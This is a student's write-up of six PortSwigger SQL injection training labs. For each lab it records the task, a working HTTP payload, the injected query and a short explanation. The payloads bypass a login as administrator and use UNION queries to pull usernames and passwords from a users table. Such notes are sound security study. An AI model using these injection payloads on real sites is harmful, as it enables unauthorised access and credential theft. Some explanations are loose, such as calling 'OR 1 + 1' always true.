# Lab 1

## Assignment

**Retrieve hidden data**: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
Make the category filter show _unreleased_ products too. Think about what `'--` does to `AND released = 1`.

## Payload (syntax)

`GET /filter?category=' OR 1 + 1 --`

## Query?

`SELECT * FROM category
WHERE name='' OR 1 + 1
--' AND released = 1
`

## Why did it work

1. ' ends the category name
2. OR 1 + 1 always returns true.
3. -- comments out the rest of the query

**2. Login bypass**: https://portswigger.net/web-security/sql-injection/lab-login-bypass
Log in as `administrator` with `administrator'--` and a blank password. Explain why the password check disappears.

## Payload (syntax)

`POST /login
csrf=2qjToDdVR9HTgsI70UaoAKUuyGH5XCqX&username=administrator%27--&password=xyz`

## Query?

`SELECT * FROM users
WHERE username='administrator'--' AND password='xyz'
`

## Why did it work

1. '-- ends the username and comments our the rest of the query

**3. UNION: retrieve data from other tables**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
Pull `username` and `password` from `users`, then log in as `administrator`. This one has two text columns; the next section is finding that out yourself.«

## Payload (syntax)

`GET /filter?category=Pets'+UNION+SELECT+username,+password+FROM+users--`

## Query?

`SELECT name, description FROM products
WHERE category = 'Pets' UNION
SELECT username, password FROM users--'
`

## Why did it work

1. ' ends the category name
2. UNION combines the result with the select from users.
3. -- comments out the rest of the query

---

### Medium: how a UNION attack is really built

**4. Determine the number of columns**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
Use `ORDER BY n--` or `UNION SELECT NULL,NULL,...--`. Note which number first errored, and why that tells you the count.

## Payload (syntax)

`GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL+FROM+products--`

## Query?

`SELECT name, price, productId FROM products
WHERE category = 'Gifts' UNION
SELECT NULL,NULL,NULL FROM products--'
`

## Why did it work

1. ' ends the category name
2. UNION combines the result with the select
3. actual table names are unknown, so I use NULL instead
4. trial one NULL at a time
5. -- comments out the rest of the query

**5. Find a column containing text**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
Swap one `NULL` at a time for `'a'` until the page accepts it. Why does a UNION fail if text lands where a number is expected?

## Payload (syntax)

`GET Pets%27%20UNION%20SELECT%206,%27a%27,6%20FROM%20products--`

## Query?

`SELECT productId, name, price FROM products
WHERE category = 'Pets' UNION
SELECT 123,'abc',456 FROM products--'
`

## Why did it work

1. ' ends the category name
2. UNION combines the result with the select
3. I replaced NULL with examples of different datatypes
4. resulting in integer, string, integer
5. -- comments out the rest of the query

**6. Retrieve multiple values in a single column**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
Only one usable column: concatenate with a separator, e.g. `' UNION SELECT NULL, username || '~' || password FROM users--`.

## Payload (syntax)

`GET /filter?category=Gifts%27%20UNION%20SELECT%20NULL,username||password%20FROM%20users--`

## Query?

`SELECT productId, name FROM products
WHERE category = 'Gifts' UNION
SELECT NULL,username||password FROM users--'
`

## Why did it work

1. ' ends the category name
2. UNION combines the result with the select
3. I replaced NULL with examples of different datatypes
4. resulting in integer, string
5. replaced NULL with username||password
6. -- comments out the rest of the query
